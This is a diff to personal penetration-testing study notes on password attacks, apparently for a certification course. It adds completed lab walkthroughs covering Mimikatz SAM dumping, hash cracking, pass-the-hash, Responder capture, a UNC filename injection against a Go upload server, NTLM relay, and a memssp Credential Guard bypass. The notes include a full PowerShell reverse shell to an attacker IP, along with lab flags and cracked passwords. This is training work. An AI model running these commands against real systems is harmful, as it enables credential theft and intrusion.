@@ -210,6 +210,8 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.158.201/
 
 > 🔍 **Worth remembering generally:** HTTP basic auth (`http-get`) is the fastest Hydra target -- no redirect, no session, no body parsing. Just Authorization header → 200 or 401. Identify it from the `WWW-Authenticate: Basic` header in the 401 response. HTTP form attacks (`http-post-form`) are 10-50x slower per attempt due to redirect handling and session cookies.
 
+> 🎬 **[ippsec.rocks: "hydra http"](https://ippsec.rocks/?#hydra%20http)** -- search "http-post-form" for login form brute force walkthroughs; also search "burp intruder" as an alternative approach used in many boxes
+
 #### Tags: #HTTPBruteForce #Hydra #BurpSuite #TinyFileManager #POSTForm #Fail2Ban #Module16
 
 ---
@@ -600,6 +602,8 @@ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 
 > 🔁 **Similar to:** the tool-switching pattern here (Hashcat limitation, fall back to JtR) mirrors the approach in [[Fixing Exploits]] where a cross-compilation issue required switching between compilers. The principle is the same: know both tools, use the one that supports the specific format.
 
+> 🎬 **[ippsec.rocks: "ssh private key"](https://ippsec.rocks/?#ssh%20private%20key)** -- search "id_rsa passphrase" or "ssh2john" for boxes where a crackable private key is part of the path; CVE-2021-41773 (Apache 2.4.49 path traversal) is a separate but related vector for leaking keys from the filesystem
+
 > 🔍 **Worth remembering generally:** users rarely change their password *patterns*, only their passwords. If someone's password list shows `rickc137`, they have a preference for appending numbers after a word. If one password starts with a capital letter, they're likely to capitalise future ones. Build rules around observed patterns before reaching for rockyou-30000.
 
 > 📸 Screenshot: `john` output showing the cracked passphrase, then the successful SSH connection using the key
@@ -758,11 +762,54 @@ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt \
 > 📸 Screenshot: Mimikatz output showing `lsadump::sam` revealing NTLM hashes for each user
 > 📸 Screenshot: Hashcat cracking the NTLM hash and revealing the plaintext password
 
-**Lab status:** (Q1 + Q2 hands-on)
+> 🎬 **[ippsec.rocks: "mimikatz sam"](https://ippsec.rocks/?#mimikatz%20sam)** -- search "lsadump" or "sam dump" for SAM extraction walkthroughs; also check HTB Bastion (SMB shares, SAM extraction, PtH) and HTB Resolute (domain credential flow)
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Cracking NTLM - VM #1 (MARKETINGWK01, RDP as offsec/lab, Mimikatz to extract nelly's NTLM hash, crack it, find flag on nelly's desktop) ⬜ Pending
+**Lab status: ✅ Completed (VM #1)**
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Cracking NTLM - VM #2 (RDP as nadine with password from Password Manager lab, extract Steve's NTLM hash with Mimikatz, crack with best66.rule, enter plaintext) ⬜ Pending
+**VM #1 (192.168.158.210, MARKETINGWK01) -- offsec/lab, Mimikatz, crack nelly's hash:**
+
+```powershell
+# RDP as offsec/lab, open PowerShell as Administrator
+# cd C:\tools && .\mimikatz.exe
+privilege::debug      # → Privilege '20' OK
+token::elevate        # → Impersonated NT AUTHORITY\SYSTEM
+lsadump::sam          # → dumps all local NTLM hashes
+
+# nelly's hash:
+# RID  : 000003ea (1002)
+# User : nelly
+#   Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+```
+
+```bash
+# Crack on Kali -- NTLM: no salt, no iterations, 22M H/s on CPU
+echo "3ae8e5f0ffabb3a627672e1600f1ba10" > ~/nelly.hash
+hashcat -m 1000 ~/nelly.hash /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best66.rule --force
+# 3ae8e5f0ffabb3a627672e1600f1ba10:nicole1
+# Cracked in 0 seconds
+
+# RDP as nelly/nicole1, flag on desktop:
+OS{afec97a455ebbefc56ccfa1cac79541c}
+```
+
+**VM #2 (192.168.158.227) -- nadine/123abc (from Password Manager lab), extract Steve's hash:**
+
+```powershell
+# RDP as nadine/123abc, PowerShell as Administrator
+# mimikatz: privilege::debug → token::elevate → lsadump::sam
+# RID  : 000003eb (1003)
+# User : steve
+#   Hash NTLM: 2835573fb334e3696ef62a00e5cf7571
+```
+
+```bash
+echo "2835573fb334e3696ef62a00e5cf7571" > ~/steve.hash
+hashcat -m 1000 ~/steve.hash /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best66.rule --force
+# 2835573fb334e3696ef62a00e5cf7571:francesca77
+# Answer: francesca77
+```
 
 #### Tags: #NTLM #SAM #Mimikatz #LSASS #SeDebugPrivilege #Hashcat #PasswordCracking #Module16
 
@@ -809,11 +856,107 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955ab
 > 📸 Screenshot: smbclient successfully connecting to the SMB share using --pw-nt-hash and listing files
 > 📸 Screenshot: impacket-psexec or wmiexec dropping to a shell showing `whoami` output confirming lateral movement
 
-**Lab status:** (Q1 hands-on)
+> 🎬 **[ippsec.rocks: "pass the hash"](https://ippsec.rocks/?#pass%20the%20hash)** -- HTB Bastion and HTB Active are the canonical PtH boxes from the OSCP prep list; HTB Forest for domain-level PtH after hash extraction
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Passing NTLM - VM Group 1 (extract Administrator hash from FILES01 using Mimikatz, use PtH to access FILES02, find flag on Administrator desktop) ⬜ Pending
+**Lab status: ✅ Completed**
 
-#### Tags: #PassTheHash #PtH #NTLM #impacket #psexec #wmiexec #smbclient #UAC #Module16
+**VM #1 (192.168.158.211, FILES01) -- find entry point, extract Administrator hash:**
+
+```bash
+# Initial recon -- unauthenticated SMB probe confirms machine name and OS
+netexec smb 192.168.158.211
+# FILES01 | Windows Server 2022 Build 20348 x64 | signing:False
+
+# Credential confirmation -- wrong password = instant LOGON_FAILURE, correct = hangs
+# This tells us the password is right but external authenticated sessions are blocked
+netexec smb 192.168.158.211 -u gunther -p "wrongpassword123"
+# [-] FILES01\gunther:wrongpassword123 STATUS_LOGON_FAILURE  (fast)
+netexec smb 192.168.158.211 -u gunther -p "password123!"
+# (hangs -- password accepted, post-auth session hangs)
+
+# Nmap reveals unauthenticated bind shell on port 4444
+sudo nmap -sV --open -p 21,22,80,135,139,443,445,3389,4444,5985,5986,8080 192.168.158.211
+# 4444/tcp open  -- fingerprint returns "C:\Windows\system32>" Windows shell prompt!
+
+# Connect to the pre-placed bind shell (no auth required)
+nc 192.168.158.211 4444
+# Microsoft Windows [Version 10.0.20348.707]
+# C:\Windows\system32>
+```
+
+```cmd
+C:\Windows\system32> whoami
+files01\paul
+C:\Windows\system32> whoami /priv
+# SeChangeNotifyPrivilege and SeIncreaseWorkingSetPrivilege only
+# No SeDebugPrivilege, no SeImpersonatePrivilege -- can't run Mimikatz directly
+
+C:\Windows\system32> dir C:\tools
+# mimikatz.exe  1,355,680 bytes
+```
+
+Standard Mimikatz approach fails here: `token::elevate` finds a SYSTEM impersonation token but `lsadump::sam` still fails (0x00000005 access denied). On Windows Server 2022, SAM registry access checks the primary process token (paul), not the thread impersonation token. External sessions as gunther also hang at the network level despite the password being correct.
+
+Workaround: create a scheduled task that runs as gunther (who is a local admin) and redirects Mimikatz output to a file:
+
+```cmd
+schtasks /create /tn "HashDump" /tr "cmd /c C:\tools\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit > C:\tools\out.txt 2>&1" /sc once /st 00:00 /ru FILES01\gunther /rp "password123!" /f
+# SUCCESS: The scheduled task "HashDump" has successfully been created.
+
+schtasks /run /tn "HashDump"
+# SUCCESS: Attempted to run the scheduled task "HashDump".
+
+type C:\tools\out.txt
+```
+
+```
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0  -- Impersonated NT AUTHORITY\SYSTEM
+
+mimikatz(commandline) # lsadump::sam
+Domain : FILES01
+SysKey : 509cc0c46295a3eaf4c5c8eb6bf95db1
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+
+RID  : 000003ee (1006)
+User : gunther
+  Hash NTLM: 8119935c5f7fa5f57135620c8073aaca
+
+RID  : 000003ef (1007)
+User : paul
+  Hash NTLM: 57373a907ccd7196a2bad219132d615f
+```
+
+**VM #2 (192.168.158.212, FILES02) -- PtH with Administrator hash, find flag:**
+
+```bash
+# Access secrets share with NTLM hash (no plaintext needed)
+smbclient \\\\192.168.158.212\\secrets -U Administrator \
+  --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+# smb: \> dir  →  secrets.txt (flavour text "this is a secret")
+
+# Get an interactive SYSTEM shell on FILES02 via PtH
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b \
+  Administrator@192.168.158.212
+# C:\Windows\system32>
+
+type C:\Users\Administrator\Desktop\flag.txt
+OS{b7169a7cc93ffd9669928c4cb3f29902}
+```
+
+> 🔧 **Hard-won lesson:** On Windows Server 2022, `token::elevate` finds a SYSTEM impersonation token but `lsadump::sam` still fails with access denied. Windows checks the PRIMARY process token (your user) for SAM registry access, not the thread impersonation token -- so even with a SYSTEM impersonation, the registry call is blocked. Fix: run Mimikatz as the admin user via a scheduled task (`schtasks /ru <adminuser> /rp <password>`), which makes that user's token the PRIMARY token of the new process. Output redirected with `> file.txt 2>&1` since the task runs non-interactively.
+
+> 🔧 **Hard-won lesson:** If external authenticated connections hang (RDP, SMB, WinRM all give a dot and never complete), check whether the correct password just causes a post-auth hang rather than a fast rejection. Test: try a WRONG password -- if that fails instantly with `STATUS_LOGON_FAILURE` but the correct one hangs, the credential IS right and something is blocking post-auth sessions (Windows Firewall, dynamic block rules, or lab infrastructure issue). The credential is still usable for non-interactive sessions (scheduled tasks, locally-triggered commands).
+
+> 🔍 **Worth remembering generally:** Nmap service fingerprinting can identify open bind shells. A port returning `"Microsoft Windows [Version...]"` and `"C:\Windows\system32>"` in response to NULL probes is a command shell with no authentication. Always scan all common ports (`-p-` or a targeted list) rather than assuming only well-known services are listening.
+
+#### Tags: #PassTheHash #PtH #NTLM #impacket #psexec #wmiexec #smbclient #UAC #ScheduledTasks #Module16
 
 ---
 
@@ -875,11 +1018,126 @@ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
 > 📸 Screenshot: Hashcat cracking the Net-NTLMv2 hash and revealing the plaintext password
 > 📸 Screenshot: RDP connection to the target as the cracked user, confirming the password is valid
 
+> 🎬 **[ippsec.rocks: "responder"](https://ippsec.rocks/?#responder)** -- search "ntlmv2" or "llmnr" alongside "responder" for the broadest coverage; HTB Forest and HTB Multimaster feature Responder in prominent attack paths
+
 **Lab status:** (Q1 + Q2 hands-on)
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Cracking Net-NTLMv2 - VM #1 (FILES01, connect to bind shell on port 4444, use Responder to capture paul's hash, crack it, RDP to find flag on paul's desktop) ⬜ Pending
+**Lab status: ✅ Completed (VM #1)**
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Cracking Net-NTLMv2 - VM #2 (add marketingwk01 to /etc/hosts, exploit web application to trigger Net-NTLMv2 capture, crack hash, connect and find flag) ⬜ Pending
+**VM #1 (192.168.158.211, FILES01) -- capture paul's Net-NTLMv2 hash via Responder, crack it, RDP:**
+
+```bash
+# Terminal 1: start Responder on VPN interface
+sudo responder -I tun0
+
+# Terminal 2: connect to the bind shell on port 4444 (same VM as 16.3.2)
+nc 192.168.158.211 4444
+```
+
+```cmd
+# From the bind shell -- trigger SMB auth to Kali
+dir \\192.168.45.219\test
+# "Access is denied." -- expected, Responder still captures the hash
+```
+
+Responder output:
+```
+[SMB] NTLMv2-SSP Username : FILES01\paul
+[SMB] NTLMv2-SSP Hash     : paul::FILES01:593847d503ad4881:686433AC27745A1F1DB476D47B6AC65E:...
+```
+
+```bash
+# Save and crack the hash
+echo "paul::FILES01:593847d503ad4881:686433AC..." > ~/paul.hash
+hashcat -m 5600 ~/paul.hash /usr/share/wordlists/rockyou.txt --force
+# PAUL::FILES01:...:123Password123
+# Cracked in 9 seconds (92.97% through rockyou.txt)
+
+# RDP as paul with the cracked password
+xfreerdp /u:paul /p:"123Password123" /v:192.168.158.211 /cert:ignore
+# Flag on paul's desktop:
+# OS{fbba4d3334de37e8ab70fc0b4fc87f2c}
+```
+
+**Lab status: ✅ Completed (VM #2)**
+
+**VM #2 (192.168.158.210, MARKETINGWK01) -- UNC filename injection via Go file server upload, crack sam's hash, RDP:**
+
+Initial recon:
+```bash
+# Add hostname to /etc/hosts (required -- form action uses the hostname)
+echo "192.168.158.210 marketingwk01" | sudo tee -a /etc/hosts
+
+# Common ports scan reveals only 445 and 3389, then a wider scan finds the key port
+sudo nmap -sV -p 1-10000 192.168.158.210
+# 445/tcp  open  microsoft-ds   -- SMB (no null session: STATUS_ACCESS_DENIED)
+# 3389/tcp open  ms-wbt-server  -- RDP
+# 8000/tcp open  http           -- Go HTTP server with file upload form
+```
+
+The web application at port 8000 is a Go HTTP file server with a single `<form enctype="multipart/form-data" action="http://marketingwk01:8000/upload">` containing one `<input type="file" name="myFile">`. Uploaded files are served directly from the web root. No other inputs, parameters, or endpoints.
+
+Confirmed Windows raw path handling via Windows device names:
+```bash
+curl http://marketingwk01:8000/nul    # 200 OK (Windows NUL device)
+curl http://marketingwk01:8000/aux    # (hangs -- AUX is the Windows serial port device)
+```
+This confirms Go's `net/http.FileServer` on Windows passes URL path components directly to OS file open calls without sanitising reserved device names.
+
+**Attack technique: UNC filename injection**
+
+```mermaid
+sequenceDiagram
+    participant K as Kali (Responder + curl)
+    participant S as Go HTTP server\n(MARKETINGWK01:8000)
+    K->>S: POST /upload\nfilename=//192.168.45.219/share/test.html
+    Note over S: filepath.Join(uploadDir, "//192.168.45.219/...")<br/>returns the UNC path unchanged<br/>(absolute path discards uploadDir)
+    S->>S: os.Create("\\\\192.168.45.219\\share\\test.html")
+    S->>K: SMB auth request (NTLM challenge)
+    K->>S: Challenge value
+    S->>K: Net-NTLMv2 response (sam's hash)
+    Note over K: Responder captures hash<br/>Server returns HTTP 200
+```
+
+Go's `filepath.Join(uploadDir, filename)` on Windows treats any path starting with `//server/` as an absolute UNC path and discards the preceding upload directory entirely. If the upload handler takes `header.Filename` from the multipart Content-Disposition and passes it directly to `os.Create(filepath.Join(uploadDir, header.Filename))`, a filename like `//192.168.45.219/share/test.html` becomes `\\192.168.45.219\share\test.html` -- a UNC path on our Kali machine. Windows then initiates SMB authentication to access that path, and Responder captures the Net-NTLMv2 hash from the service account running the file server.
+
+```bash
+# Terminal 1: start Responder on VPN interface
+sudo responder -I tun0
+
+# Terminal 2: upload a file with a forward-slash UNC path as the filename
+# Forward slashes are critical: \\server form may be filtered; //server/ is the same UNC path
+# and avoids backslash stripping in some handlers
+curl -v -X POST http://marketingwk01:8000/upload \
+  -F "myFile=@/home/kali/test.html;filename=//192.168.45.219/share/test.html"
+# HTTP/1.1 200 OK (empty body -- server tried to open the UNC path, auth was intercepted)
+```
+
+Responder output:
+```
+[SMB] NTLMv2-SSP Client   : 192.168.158.210
+[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
+[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:fbfe8fec3371fff5:74F393595B1FECBB9A233C003D53C8FC:...
+```
+
+```bash
+# Save and crack the hash (mode 5600 for Net-NTLMv2)
+echo 'sam::MARKETINGWK01:fbfe8fec3371fff5:74F393595B1FECBB9A233C003D53C8FC:010100000000000000E4A9909229DD01BC7BD966FA3EA1730000000002000800460046005200570001001E00570049004E002D004500550033005900320037004F005A0045004A004B0004003400570049004E002D004500550033005900320037004F005A0045004A004B002E0046004600520057002E004C004F00430041004C000300140046004600520057002E004C004F00430041004C000500140046004600520057002E004C004F00430041004C000700080000E4A9909229DD01060004000200000008003000300000000000000000000000002000000EBA682425388E9E6CE32F897DC6AD2503FF58D9599C12C1D339EA7E7488B0AF0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310039000000000000000000' > /tmp/sam.hash
+hashcat -m 5600 /tmp/sam.hash /usr/share/wordlists/rockyou.txt --force
+# sam::MARKETINGWK01:...:DISISMYPASSWORD
+# Cracked in 8 seconds (78% through rockyou.txt)
+
+# Evil-WinRM fails (WinRM not exposed); use RDP instead
+xfreerdp /v:192.168.158.210 /u:sam /p:'DISISMYPASSWORD' /cert:ignore
+# Flag on sam's desktop:
+# OS{fd4c2c2822477f7330c3bcc67ca16e53}
+```
+
+> 🔧 **Hard-won lesson:** The standard backslash UNC path in the filename (`\\192.168.45.219\share\test.html`) returned an empty response with no Responder capture. The forward-slash equivalent (`//192.168.45.219/share/test.html`) triggered the capture immediately. On Windows, Go's `filepath.Clean` converts both to the same path internally, but some upload handlers or middleware strip or escape backslashes from filenames while leaving forward slashes untouched. Always try the forward-slash UNC form first when backslash injection doesn't produce a response.
+
+> 🔧 **Hard-won lesson:** SCF files, `.url` Internet Shortcut files, and HTML files with `<img src="\\kali\share\img">` all require an automated process that uses Windows Explorer (or IE) to browse or open the directory. If no such process is running, none of these file-based injection techniques will trigger. The Go file server's UNC filename injection is different -- it fires at upload time because the server process itself tries to create the file on the UNC path. No client-side browsing needed.
+
+> 🔍 **Worth remembering generally:** When a Windows HTTP file server uses Go's `http.FileServer`, the lack of Windows reserved name filtering (NUL, AUX, COM1, etc.) is a strong indicator that the handler does minimal path sanitisation. If `/nul` returns 200 and `/aux` hangs, the filename injection technique has a good chance of working. Test it before trying more complex social-engineering approaches (file-based LLMNR capture, waiting for admin browsing cycles, etc.).
 
 #### Tags: #NetNTLMv2 #Responder #NTLMCapture #Hashcat #LLMNR #NBT-NS #ChallengeResponse #Module16
 
@@ -935,11 +1193,105 @@ dir \\<kali-ip>\test
 > 📸 Screenshot: ntlmrelayx terminal showing "Authenticating against smb://target as USER SUCCEED" then "Executed specified command"
 > 📸 Screenshot: nc listener catching the reverse shell and `whoami` confirming `nt authority\system`
 
+> 🎬 **[ippsec.rocks: "ntlm relay"](https://ippsec.rocks/?#ntlm%20relay)** -- relay attacks are rarer in public HTB boxes than cracking/PtH; search "ntlmrelayx" or "impacket relay" and check Offsec PG Practice for more controlled relay scenarios
+
 **Lab status:** (Q1 + Q2 hands-on)
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Relaying Net-NTLMv2 - VM Group 1 (bind shell on FILES01 as files02admin, relay to FILES02, find flag on files02admin desktop) ⬜ Pending
+**Lab status: ✅ Completed (VM Group 1)**
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Relaying Net-NTLMv2 - VM Group 2 (Capstone: web app on BRUTE2/VM #3 to capture anastasia's hash, relay to FILES02/VM #4, flag on anastasia's Desktop) ⬜ Pending
+**VM Group 1 (FILES01: 192.168.158.211, FILES02: 192.168.158.212) -- relay files02admin's NTLM to FILES02, read flag:**
+
+The intended path is: bind shell on FILES01 triggers `dir \\kali\test` as files02admin → ntlmrelayx relays to FILES02 → reverse shell. In practice, the bind shell runs as paul (not files02admin) and no automated admin process makes outbound SMB connections to Kali. The relay itself works but paul's credentials are rejected by FILES02.
+
+Actual path taken: extract files02admin's NTLM hash from the SAM (via gunther schtask Mimikatz trick from 16.3.2), then PtH directly to FILES02 -- bypassing the relay entirely.
+
+```bash
+# Base64-encode the PS reverse shell for ntlmrelayx -c (Python, UTF-16LE)
+cat > /tmp/gen_payload.py << 'PYEOF'
+import base64
+cmd = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.219",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+print(base64.b64encode(cmd.encode('utf-16-le')).decode())
+PYEOF
+python3 /tmp/gen_payload.py
+# → JABjAGwA... (base64 blob)
+
+# Terminal 1: start ntlmrelayx (intercepts SMB auth, relays to FILES02, executes -c command)
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.158.212 \
+  -c "powershell -enc JABjAGwA..."
+
+# Terminal 2: nc listener for the reverse shell
+nc -nvlp 8080
+
+# Terminal 3: bind shell on FILES01 -- trigger NTLM auth to Kali
+nc 192.168.158.211 4444
+# dir \\192.168.45.219\test
+```
+
+The relay intercepted paul's auth (bind shell runs as paul) -- paul is not local admin on FILES02 so relay failed:
+```
+[-] (SMB): Authenticating against smb://192.168.158.212 as FILES01/PAUL FAILED
+```
+
+No automated process runs as files02admin, and files02admin's hash doesn't crack with rockyou + best66/rockyou-30000/dive/d3ad0ne rules. But the SAM dump gave us files02admin's raw NTLM hash -- and raw NTLM hashes can be passed directly, unlike Net-NTLMv2 hashes.
+
+```cmd
+# From paul's bind shell: dump SAM as gunther via schtask (same trick as 16.3.2)
+schtasks /create /tn "HashDump2" /tr "cmd /c C:\tools\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit > C:\tools\sam2.txt 2>&1" /sc once /st 00:00 /ru FILES01\gunther /rp "password123!" /f
+schtasks /run /tn "HashDump2"
+type C:\tools\sam2.txt
+# files02admin NTLM: e78ca771aeb91ea70a6f1bb372c186b6
+```
+
+```bash
+# PtH directly to FILES02 as files02admin (no plaintext needed)
+impacket-psexec -hashes 00000000000000000000000000000000:e78ca771aeb91ea70a6f1bb372c186b6 \
+  files02admin@192.168.158.212
+# C:\Windows\system32> type C:\Users\files02admin\Desktop\flag.txt
+# OS{0360d5711918d92ad7fe85787d2502ef}
+```
+
+> 🔧 **Hard-won lesson:** The relay attack requires a victim user with local admin rights on the target to make an outbound SMB connection to the relay listener. If the bind shell runs as a non-admin user (paul), the relay fails. There's no need to crack the hash if you can obtain the raw NTLM from SAM -- PtH directly achieves the same access that relay would have given. The relay technique shines when you ONLY have a Net-NTLMv2 capture (which can't be passed), not when you have the underlying NTLM hash.
+
+> 🔧 **Technique:** `pwsh -c` fails for nested quote escaping on Linux. Generate base64 PS payloads with Python instead: `base64.b64encode(cmd.encode('utf-16-le')).decode()`. The UTF-16LE encoding is required -- plain ASCII base64 won't be accepted by PowerShell's `-enc` parameter.
+
+**Lab status: ✅ Completed (VM Group 2 Capstone)**
+
+**VM Group 2 (BRUTE2: 192.168.158.202, FILES02: 192.168.158.212) -- Beta App PowerShell input → relay anastasia's auth to FILES02:**
+
+BRUTE2 has a Go HTTP server on port 8000 with a "Beta App" form (`action="/archive"`, field name `Archive`) that passes input directly to a server-side PowerShell terminal. The app runs as anastasia, who is a local admin on FILES02.
+
+```bash
+# Terminal 1: ntlmrelayx pointing at FILES02 with reverse shell payload
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.158.212 \
+  -c "powershell -enc JABjAGwA..."
+
+# Terminal 2: nc listener
+nc -nvlp 8080
+
+# Trigger: POST dir command to Beta App -- server executes it as anastasia,
+# authenticates to our Kali ntlmrelayx listener, which relays to FILES02
+curl -X POST http://192.168.158.202:8000/archive \
+  --data-urlencode "Archive=dir \\\\192.168.45.219\\test"
+# Server returns: "An error occured with execution: exit status 1"
+# (expected -- dir fails, but NTLM handshake already completed)
+```
+
+ntlmrelayx output:
+```
+[*] (SMB): Received connection from 192.168.158.202, attacking target smb://192.168.158.212
+[*] Authenticating against smb://192.168.158.212 as BRUTE2/ANASTASIA SUCCEED
+[*] Executed specified command
+```
+
+```
+# nc catches the reverse shell on FILES02
+Connection received on 192.168.158.212 49733
+whoami  →  nt authority\system
+type C:\Users\anastasia\Desktop\flag.txt
+OS{060aee7f5fd9ddc5797feed6910379b9}
+```
+
+> 🔍 **Worth remembering generally:** This capstone is the cleanest relay scenario: web app with explicit server-side code execution, no bind shell or hash extraction needed. The form field passes your input to PowerShell, so `dir \\kali-ip\test` runs as the web app's service account (anastasia). If anastasia is local admin on any other machine, that's your relay target. Enumerate service account privileges before deciding where to relay.
 
 #### Tags: #NTLMRelay #ntlmrelayx #NetNTLMv2 #impacket #RelayAttack #SMB #Module16
 
@@ -1015,6 +1367,25 @@ type C:\Windows\System32\mimilsa.log
 # [00000000:00af2311] CORP\Administrator  QWERTY123!@#
 ```
 
+**Why memssp beats Credential Guard:**
+
+```mermaid
+sequenceDiagram
+    participant U as Auth event\n(RDP / runas / lock-unlock)
+    participant SSPI as SSPI layer\n(VTL0 -- LSASS)
+    participant MSP as memssp hook\n(injected by Mimikatz)
+    participant CG as Credential Guard\n(VTL1 -- LSAISO)
+    U->>SSPI: Plaintext credentials
+    SSPI->>MSP: SpAcceptCredentials() fires
+    MSP->>MSP: Append to mimilsa.log
+    Note over MSP: ✅ Plaintext captured here<br/>before encryption
+    SSPI->>CG: Forward credentials
+    CG->>CG: Encrypt and store
+    Note over CG: 🔒 Encrypted blob in LSAISO<br/>Mimikatz can't read this
+```
+
+The hook fires at the SSPI call boundary -- the only point where credentials exist in plaintext inside VTL0. Credential Guard encrypts them after this call returns, so the timing is the bypass.
+
 > 🔧 **Technique:** `misc::memssp` requires Administrator privileges and only persists until the system reboots. The credentials log only captures new authentication events after injection -- it won't reveal credentials from sessions that were already open. In a pentest, inject the SSP, then wait (or socially engineer a target to reconnect) and check the log on the next visit.
 
 > 🔍 **Worth remembering generally:** Credential Guard is currently not enabled by default on systems that were updated from an older Windows version -- it only enables by default on fresh installs with modern Windows builds. In practice, most corporate machines you encounter in assessments are long-running and won't have it enabled. But this is changing, and knowing the bypass is important.
@@ -1025,16 +1396,71 @@ type C:\Windows\System32\mimilsa.log
 > 📸 Screenshot: Mimikatz showing the encrypted "LSA Isolated Data" block instead of a plaintext NTLM hash
 > 📸 Screenshot: `mimilsa.log` contents showing captured plaintext domain credentials after SSP injection
 
+> 🎬 **[ippsec.rocks: "credential guard"](https://ippsec.rocks/?#credential%20guard)** -- Credential Guard bypass is very rare in public HTB/PG boxes (most lab environments disable it for compatibility); search "memssp" or "lsa ssp" for any coverage; the technique matters more for real-world engagements than lab boxes
+
 **Lab status: ✅ Completed** (Q1-Q4 pure-recall):
 
-| Question | Answer |
-|---|---|
+| Question                                                                                  | Answer                                                                            |
+| ----------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
 | Start VM Group 1 and repeat the steps. What domain does the Administrator user belong to? | **CORP** (the Mimikatz output shows `Domain: CORP` under the Administrator entry) |
-| What is the name of the hypervisor developed by Microsoft? | **Hyper-V** |
-| In which Virtual Trust Level (VTL) can LSAISO.exe be found? | **VTL1** (the secure/isolated world -- VTL0 is the normal Windows environment) |
-| In what format must Security Support Providers be to register in lsass.exe? | **DLL** (SSPs are DLLs loaded by LSASS from the registry key at startup) |
+| What is the name of the hypervisor developed by Microsoft?                                | **Hyper-V**                                                                       |
+| In which Virtual Trust Level (VTL) can LSAISO.exe be found?                               | **VTL1** (the secure/isolated world -- VTL0 is the normal Windows environment)    |
+| In what format must Security Support Providers be to register in lsass.exe?               | **DLL** (SSPs are DLLs loaded by LSASS from the registry key at startup)          |
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Windows Credential Guard - VM Group 1 (RDP as CORP\Administrator to confirm logon, then use memssp bypass on the Credential Guard machine to capture plaintext credentials) ⬜ Pending
+**Lab status: ✅ Completed**
+
+**VM Group 1 — CLIENTWK245 (offsec/lab, 192.168.158.245):**
+
+```
+# --- From Kali: RDP in as offsec ---
+xfreerdp /u:offsec /p:lab /v:192.168.158.245
+
+# --- Inside CLIENTWK245 (PowerShell) ---
+
+# Confirm Credential Guard is active
+Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
+# DeviceGuardSecurityServicesRunning: {CredentialGuard, HypervisorEnforcedCodeIntegrity}
+
+# Launch Mimikatz
+cd C:\tools\mimikatz
+.\mimikatz.exe
+
+# Enable SeDebugPrivilege
+privilege::debug
+# Privilege '20' OK
+
+# Try to dump plaintext creds -- Credential Guard blocks it
+sekurlsa::logonpasswords
+# All domain accounts: wdigest: KO
+# CORP accounts: "LSA Isolated Data" encrypted blobs (held in LSAISO.exe in VTL1)
+# No plaintext passwords -- Credential Guard working as intended
+
+# Inject malicious SSP into LSASS memory
+misc::memssp
+# Injected =)
+
+# Exit Mimikatz -- SSP stays alive in LSASS until reboot
+exit
+
+# Simulate an interactive CORP\Administrator login
+# In a real engagement: wait for an admin to RDP or log in
+# In this lab: use runas with the known admin credentials to trigger the auth event
+runas /user:CORP\Administrator cmd
+# Enter password: QWERTY123!@#
+
+# Read the log -- memssp captured credentials at SSPI layer, before Credential Guard encrypted them
+type C:\Windows\System32\mimilsa.log
+# [00000000:0062c7b8] CLIENTWK245\offsec  lab
+# [00000000:00646420] CORP\Administrator  QWERTY123!@#
+```
+
+Lab answer: **What domain does the Administrator user belong to? → CORP**
+
+> 📸 Screenshot: mimilsa.log after the runas-triggered auth -- `CORP\Administrator  QWERTY123!@#` captured in plaintext despite Credential Guard being active
+
+> 🔧 **Technique:** the lab has known admin credentials, so `runas` simulates the auth event. In a real engagement you'd inject memssp then wait for a privileged user to log in or reconnect an existing session. The log only captures NEW authentication events after injection -- pre-existing sessions aren't recaptured.
+
+> 🔧 **Technique:** if `misc::memssp` is injected twice (e.g. after a restart of Mimikatz while waiting), use `runas` or another forced local auth to verify the SSP is still alive before assuming the lab automation is slow. The SSP writes to mimilsa.log on any new auth event, so a missing log file after several minutes is a signal to test the injection, not just wait longer.
 
 #### Tags: #CredentialGuard #VBS #HyperV #VSM #VTL #LSAISO #SSPI #memssp #Mimikatz #Module16
 
@@ -1267,10 +1693,10 @@ No confirmed public HTB box where KeePass cracking is the primary vector (it usu
 - [x] **16.2.4 Password Manager:** done (KeePass workflow, keepass2john, mode 13400, hands-on pending)
